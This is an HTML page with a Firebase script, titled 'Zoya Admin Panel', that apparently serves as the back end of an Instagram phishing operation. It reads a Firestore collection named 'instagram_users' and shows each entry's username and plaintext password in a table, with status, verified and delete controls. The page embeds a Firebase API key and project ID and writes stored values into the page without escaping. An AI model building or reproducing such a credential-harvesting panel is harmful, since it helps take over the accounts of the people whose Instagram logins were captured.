<!DOCTYPE html>
<html>
<head>
  <title>🔥 Zoya Admin Panel</title>

  <!-- Firebase v8 (GitHub safe) -->
  <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
  <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-firestore.js"></script>

  <!-- Font -->
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;500;700&display=swap" rel="stylesheet">

  <style>
    body {
      margin: 0;
      font-family: 'Poppins', sans-serif;
      background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
      color: #fff;
    }

    /* ✅ SAFE gradient only for heading */
    h2 {
      text-align: center;
      margin-top: 20px;
      font-size: 28px;
      background: linear-gradient(45deg, #00f2fe, #4facfe);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
    }

    .container {
      width: 90%;
      margin: 30px auto;
      background: rgba(0,0,0,0.6);
      border-radius: 15px;
      padding: 20px;
      box-shadow: 0 0 25px rgba(0,0,0,0.6);
    }

    .top-bar {
      display: flex;
      justify-content: space-between;
      margin-bottom: 15px;
    }

    input {
      padding: 8px;
      border-radius: 8px;
      border: 1px solid #00f2fe;
      outline: none;
      width: 220px;
      background: rgba(0,0,0,0.7);
      color: #ffffff;
    }

    input::placeholder {
      color: #aaa;
    }

    table {
      width: 100%;
      border-collapse: collapse;
      background: rgba(0,0,0,0.8);
      border-radius: 10px;
      overflow: hidden;
    }

    th {
      padding: 12px;
      background: rgba(0,0,0,0.9);
      color: #00f2fe;
      text-transform: uppercase;
      font-size: 13px;
      letter-spacing: 1px;
    }

    td {
      padding: 12px;
      text-align: center;
      color: #ffffff;
      font-weight: 500;
      border-bottom: 1px solid rgba(255,255,255,0.1);
    }

    tr:hover {
      background: rgba(0,255,255,0.08);
      transition: 0.3s;
    }

    .btn-delete {
      background: linear-gradient(45deg, #ff416c, #ff4b2b);
      border: none;
      padding: 6px 14px;
      color: white;
      border-radius: 20px;
      cursor: pointer;
      transition: 0.3s;
    }

    .btn-delete:hover {
      transform: scale(1.1);
      box-shadow: 0 0 10px #ff4b2b;
    }

    .status {
      padding: 5px 12px;
      border-radius: 15px;
      font-size: 12px;
      font-weight: 600;
    }

    .pending {
      background: linear-gradient(45deg, orange, gold);
      color: black;
    }

    .verified {
      background: linear-gradient(45deg, #00ff87, #60efff);
      color: black;
    }

    /* 🚨 FORCE FIX (main bug fix) */
    td, th {
      -webkit-text-fill-color: #ffffff !important;
      color: #ffffff !important;
    }

    th {
      color: #00f2fe !important;
      -webkit-text-fill-color: #00f2fe !important;
    }

  </style>
</head>

<body>

<h2>🚀 Zoya Admin Panel</h2>

<div class="container">

  <div class="top-bar">
    <input type="text" id="search" placeholder="Search username..." onkeyup="filterUsers()">
  </div>

  <table id="userTable">
    <thead>
      <tr>
        <th>Username</th>
        <th>Password</th>
        <th>Status</th>
        <th>Verified</th>
        <th>Action</th>
      </tr>
    </thead>
    <tbody></tbody>
  </table>

</div>

<script>
const firebaseConfig = {
  apiKey: "AIzaSyAcc6qlrnYArscNXN7uyZc_MG5DxLxQNOI",
  authDomain: "vega-70de0.firebaseapp.com",
  projectId: "vega-70de0"
};

firebase.initializeApp(firebaseConfig);
const db = firebase.firestore();

const tableBody = document.querySelector("#userTable tbody");

function loadUsers() {
  tableBody.innerHTML = "";

  db.collection("instagram_users").get().then((snapshot) => {
    snapshot.forEach((doc) => {
      const data = doc.data();
      const statusClass = data.status === "pending" ? "pending" : "verified";

      const row = document.createElement("tr");

      row.innerHTML = `
        <td>${data.username || ""}</td>
        <td>${data.password || ""}</td>
        <td><span class="status ${statusClass}">${data.status}</span></td>
        <td>${data.verified}</td>
        <td><button class="btn-delete" onclick="deleteUser('${doc.id}')">Delete</button></td>
      `;

      tableBody.appendChild(row);
    });
  });
}

function deleteUser(id) {
  if (confirm("Delete this user?")) {
    db.collection("instagram_users").doc(id).delete().then(() => {
      loadUsers();
    });
  }
}

function filterUsers() {
  const input = document.getElementById("search").value.toLowerCase();
  const rows = document.querySelectorAll("#userTable tbody tr");

  rows.forEach(row => {
    const username = row.children[0].textContent.toLowerCase();
    row.style.display = username.includes(input) ? "" : "none";
  });
}

loadUsers();
</script>

</body>
</html>
